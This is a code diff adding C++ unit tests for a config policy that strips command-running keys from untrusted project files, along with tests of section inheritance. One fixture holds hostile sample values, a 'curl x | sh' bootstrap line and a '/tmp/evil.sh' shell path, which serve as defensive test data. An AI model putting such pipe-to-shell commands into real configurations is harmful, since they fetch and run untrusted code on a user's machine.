@@ -28,6 +28,9 @@ DLL_EXPORT int test_config_project_strip(ITesting *t);
 DLL_EXPORT int test_config_project_strip_section(ITesting *t);
 DLL_EXPORT int test_config_project_merge(ITesting *t);
 DLL_EXPORT int test_config_policy_denied(ITesting *t);
+DLL_EXPORT int test_config_project_strip_anysection(ITesting *t);
+DLL_EXPORT int test_config_inherit(ITesting *t);
+DLL_EXPORT int test_config_inherit_guards(ITesting *t);
 DLL_EXPORT int test_config_patch_replace(ITesting *t);
 DLL_EXPORT int test_config_patch_insert(ITesting *t);
 DLL_EXPORT int test_config_patch_newsection(ITesting *t);
@@ -230,6 +233,118 @@ DLL_EXPORT int test_config_policy_denied(ITesting *t) {
     TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"terminal", "scrollback_lines"}));
     TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"editorview", "wrap"}));
     TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({}));
+    // The command keys in any section - a configured tab hands any section to a terminal
+    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"ai_agent", "bootstrap"}));
+    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"ai_agent", "shell"}));
+    TR_ASSERT(t, ProjectConfigPolicy::IsDenied({"ai_agent"}));
+    TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"ai_agent", "promote_target"}));
+    TR_ASSERT(t, !ProjectConfigPolicy::IsDenied({"ai_agent", "inherit"}));
+    return kTR_Pass;
+}
+
+DLL_EXPORT int test_config_project_strip_anysection(ITesting *t) {
+    auto projectConfig = ConfigNode::FromString(
+        "ai_agent:\n"
+        "  inherit: terminal\n"
+        "  bootstrap:\n"
+        "    - curl x | sh\n"
+        "  promote_target: yes\n"
+        "tools:\n"
+        "  deep:\n"
+        "    init: -c evil\n"
+        "    keep: 1\n"
+        "panel:\n"
+        "  tabs:\n"
+        "    - name: Evil\n"
+        "      shell: /tmp/evil.sh\n"
+        "editorview: none\n");
+    TR_ASSERT(t, projectConfig.has_value());
+    auto removed = ProjectConfigPolicy::StripDeniedKeys(projectConfig.value());
+    auto &cfg = projectConfig.value();
+    TR_ASSERT(t, removed.size() == 4);
+    TR_ASSERT(t, !cfg["ai_agent"].HasKey("bootstrap"));
+    TR_ASSERT(t, cfg["ai_agent"].GetStr("inherit") == "terminal");
+    TR_ASSERT(t, cfg["ai_agent"].GetBool("promote_target"));
+    TR_ASSERT(t, !cfg["tools"]["deep"].HasKey("init"));
+    TR_ASSERT(t, cfg["tools"]["deep"].GetInt("keep") == 1);
+    TR_ASSERT(t, !cfg["panel"]["tabs"][0].HasKey("shell"));
+    TR_ASSERT(t, cfg["panel"]["tabs"][0].GetStr("name") == "Evil");
+    TR_ASSERT(t, !cfg.HasKey("editorview"));    // a scalar section would replace the whole section
+    return kTR_Pass;
+}
+
+DLL_EXPORT int test_config_inherit(ITesting *t) {
+    auto cfg = ConfigNode::FromString(
+        "terminal:\n"
+        "  init: -is\n"
+        "  bootstrap: [ ls, pwd ]\n"
+        "  scrollback_lines: 100\n"
+        "  colours:\n"
+        "    fg: white\n"
+        "    bg: black\n"
+        "ai_agent:\n"
+        "  inherit: terminal\n"
+        "  bootstrap: [ claude ]\n"
+        "  colours:\n"
+        "    bg: blue\n"
+        "  promote_target: yes\n"
+        "codex:\n"
+        "  inherit: ai_agent\n"
+        "  scrollback_lines: 7\n");
+    TR_ASSERT(t, cfg.has_value());
+
+    // The leaf's keys win, the parent fills the rest; a list is the leaf's whole, a map merges key by key
+    auto agent = cfg->ResolveSection("ai_agent");
+    TR_ASSERT(t, !agent.HasKey("inherit"));
+    TR_ASSERT(t, agent.GetStr("init") == "-is");
+    TR_ASSERT(t, agent.GetSequenceOfStr("bootstrap") == std::vector<std::string>{"claude"});
+    TR_ASSERT(t, agent.GetInt("scrollback_lines") == 100);
+    TR_ASSERT(t, agent["colours"].GetStr("bg") == "blue");
+    TR_ASSERT(t, agent["colours"].GetStr("fg") == "white");
+    TR_ASSERT(t, agent.GetBool("promote_target"));
+
+    // Several levels
+    auto codex = cfg->ResolveSection("codex");
+    TR_ASSERT(t, codex.GetInt("scrollback_lines") == 7);
+    TR_ASSERT(t, codex.GetSequenceOfStr("bootstrap") == std::vector<std::string>{"claude"});
+    TR_ASSERT(t, codex.GetStr("init") == "-is");
+
+    // A section without inherit stands alone
+    auto terminal = cfg->ResolveSection("terminal");
+    TR_ASSERT(t, terminal.GetSequenceOfStr("bootstrap").size() == 2);
+    TR_ASSERT(t, !terminal.HasKey("promote_target"));
+
+    // A copy: changing it leaves the tree alone, and the tree's sections are as written
+    agent.SetInt("scrollback_lines", 1);
+    TR_ASSERT(t, (*cfg)["terminal"].GetInt("scrollback_lines") == 100);
+    TR_ASSERT(t, !(*cfg)["ai_agent"].HasKey("init"));
+    TR_ASSERT(t, (*cfg)["ai_agent"].GetStr("inherit") == "terminal");
+    TR_ASSERT(t, (*cfg)["terminal"]["colours"].GetStr("bg") == "black");
+    return kTR_Pass;
+}
+
+DLL_EXPORT int test_config_inherit_guards(ITesting *t) {
+    auto cfg = ConfigNode::FromString(
+        "a:\n"
+        "  inherit: b\n"
+        "  x: 1\n"
+        "b:\n"
+        "  inherit: a\n"
+        "  y: 2\n"
+        "orphan:\n"
+        "  inherit: nowhere\n"
+        "  z: 3\n");
+    TR_ASSERT(t, cfg.has_value());
+    // A loop ends at the first section seen twice - both keys, no hang
+    auto a = cfg->ResolveSection("a");
+    TR_ASSERT(t, a.GetInt("x") == 1);
+    TR_ASSERT(t, a.GetInt("y") == 2);
+    // A missing parent: the section on its own
+    auto orphan = cfg->ResolveSection("orphan");
+    TR_ASSERT(t, orphan.GetInt("z") == 3);
+    TR_ASSERT(t, !orphan.HasKey("inherit"));
+    // No such section
+    TR_ASSERT(t, !cfg->ResolveSection("missing").GetDataNode().IsDefined());
     return kTR_Pass;
 }
 
